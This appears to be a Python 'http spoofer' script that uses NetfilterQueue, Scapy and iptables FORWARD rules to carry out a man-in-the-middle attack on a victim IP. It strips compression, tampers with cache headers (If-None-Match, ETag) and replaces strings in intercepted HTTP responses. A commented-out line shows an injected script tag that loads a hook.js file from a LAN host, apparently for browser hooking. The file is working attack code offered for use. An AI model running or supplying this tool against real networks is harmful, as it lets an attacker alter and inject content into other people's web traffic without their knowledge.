import matplotlib
matplotlib.use('Agg')

# github.com/kti/python-netfilterqueue

from netfilterqueue import NetfilterQueue
from scapy.all import *
import os
import sys

def callback(packet):
    # format the raw packet as a Scapy packet
    pkt = IP(packet.get_payload())

    ##########################################
    # outgoing packets from victim to server
    if pkt.haslayer(Raw) and pkt.haslayer(TCP) and pkt[TCP].dport == 80 and pkt[IP].src == vip:

        # grab the TCP payload
        http_content = pkt[Raw].load

        # change the 'Accept-Encoding: ' entry to identity
        # this requests an uncompressed version of the html page
        field = b'Accept-Encoding: '
        size = len(field)
        x = http_content.find(field)
        if x > 0:
            y = http_content.find(b'\r\n',x)

            # grab the entry
            entry = http_content[x+size : y]

            # 'gzip, deflate' seems to be common -- it's 13 bytes
            # 'identity;q=1.' is also conveniently 13 bytes
            if entry == b'gzip, deflate':
                replacement = b'identity;q=1.'
                http_content = http_content[:x+size] + replacement + http_content[y:]


        # change first byte of the 'If-None-Match: "xxxx"' entry
        # this tells the server "my cached copy does not match yours"
        # server will send full file, and correct ETag
        field = b'If-None-Match: "'
        size = len(field)
        x = http_content.find(field)
        if x > 0:

            # check the first byte of the entry
            entry = http_content[x+size : x+size+1]
            # if it's not already 'c', change it to 'c'
            # if it is 'c', change it to '1'
            # these are just random choices
            if entry != b'c':
                http_content = http_content[:x+size] + b'c' + http_content[x+size+1:]
            else:
                http_content = http_content[:x+size] + b'1' + http_content[x+size+1:]

        # update the payload with our modified payload
        pkt[Raw].load = http_content

        # recompute checksums and IP length field
        del pkt[TCP].chksum
        del pkt[IP].len
        del pkt[IP].chksum
        pkt = pkt.__class__(raw(pkt)) # ty stack exchange <3




    # modify the response from the server
    if pkt.haslayer(Raw) and pkt.haslayer(TCP) and pkt[TCP].sport == 80 and pkt[IP].dst == vip:

        # grab the TCP payload
        http_content = pkt[Raw].load

        # modify the html...
        #x = http_content.find(b'"Apache&rsquo;s')
        #hook = b'<script src="http://192.168.1.144:3000/hook.js"></script>'
        """
	word = b'<title>'
        wordlen = len(word)
        x = http_content.find(word)

        hook = b'Sausage'
        size = len(hook)
        if x > 0:
            http_content = http_content[:x+wordlen] + hook + http_content[x+wordlen+size:]
        """
        http_content = http_content.replace(str, repl)

        # change the second byte of 'ETag: "xxxx"' entry
        # this gives the client browser a wrong cache tag
        # will revert any cached changes once the attack stops
        field = b'ETag: "'
        size = len(field)
        x = http_content.find(field)
        if x > 0:

            # check the second byte of the entry
            entry = http_content[x+size+1: x+size+2]
            # if it's not already 'a', change it to 'a'
            # if it is 'a', change it to '2'
            if entry != b'a':
                http_content = http_content[:x+size+1] + b'a' + http_content[x+size+2:]
            else:
                http_content = http_content[:x+size+1] + b'2' + http_content[x+size+2:]



        # update the payload with our modified payload
        pkt[Raw].load = http_content

        # delete checksums and recompute
        del pkt[TCP].chksum
        del pkt[IP].len
        del pkt[IP].chksum
        pkt = pkt.__class__(raw(pkt)) # ty stack exchange <3


    # send the (modified) packet off
    packet.set_payload(raw(pkt))
    packet.accept()

def usage(program_name):
    print(f'usage:\t{program_name} <victim ip> <string to replace> <replacement string>')
    sys.exit(0)

if __name__ == '__main__':

    if len(sys.argv) != 4:
        usage(sys.argv[0])

    if (len(sys.argv[2]) != len(sys.argv[3])):
        print('Strings must be the same length.')
        sys.exit(0)

    global vip
    global str
    global repl
    vip = sys.argv[1]
    str = sys.argv[2].encode()
    repl = sys.argv[3].encode()


    print('\n---------- \x1b[1;33mhttp spoofer\x1b[0m ----------')
    print('\x1b[1;33m[+] \x1b[0mSpoofing http requests...')
    print(f'\tIP: {vip}')
    print(f'\x1b[1;33m[+] \x1b[0mReplacing all strings on page: {sys.argv[2]} \x1b[1;33m--> \x1b[0m{sys.argv[3]}')

    #os.system("iptables -P INPUT ACCEPT")
    #os.system("iptables -P OUTPUT ACCEPT")
    #os.system("iptables -P FORWARD ACCEPT")
    #os.system("iptables -F FORWARD")
    #os.system("iptables -F")
    #os.system("iptables -I INPUT -p tcp --sport 80 -j NFQUEUE --queue-num 1")
    #os.system("iptables -I OUTPUT -p tcp --dport 80 -j NFQUEUE --queue-num 1")
    os.system("iptables -I FORWARD -p tcp --dport 80 -j NFQUEUE --queue-num 1")
    os.system("iptables -I FORWARD -p tcp --sport 80 -j NFQUEUE --queue-num 1")

    nfqueue = NetfilterQueue()
    nfqueue.bind(1, callback)
    try:
        nfqueue.run()
    except KeyboardInterrupt:
        print('')

    nfqueue.unbind()
    os.system("iptables -F FORWARD")

   # os.system("iptables-restore < /etc/iptables/rules.v4")
    print("\x1b[1;33m[+] \x1b[0mTerminating program...")
    print("\tSpoofing stopped.")
    print("\x1b[1;33m[+] \x1b[0mExiting...")
